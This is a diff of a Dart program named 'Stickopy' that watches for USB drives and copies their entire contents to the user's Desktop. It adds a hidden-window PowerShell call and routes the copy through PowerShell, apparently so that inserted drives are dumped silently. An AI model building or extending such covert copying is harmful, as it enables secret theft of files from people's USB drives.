@@ -4,6 +4,9 @@ import "dart:async";
 import "global_var.dart" as glb;
 
 main() {
+  Process.run(
+      "powershell", ["-WindowStyle", "Hidden", "-command", "echo Stickopy"]);
+
   glb.Global gl = new glb.Global();
   gl.copied = [];
 
@@ -94,12 +97,15 @@ periodic(gl) {
               if (to_copy) {
                 // Do the following if the USB has to be copied.
                 String deviceID_simple = deviceID.replaceAll(":", "");
-                Process.run("xcopy", [
-                  // Copy the contents of the drive.
-                  "/E",
-                  "/I",
-                  deviceID + "\\",
-                  Platform.environment['UserProfile'] +
+                Process.run("powershell", [
+                  // Copy the content of the drive.
+                  //"-WindowStyle",
+                  //"Hidden",
+                  "-command",
+                  "xcopy /E /I " +
+                      deviceID +
+                      "\\ " +
+                      Platform.environment['UserProfile'] +
                       "\\Desktop\\" +
                       deviceID_simple +
                       "_drive_" +
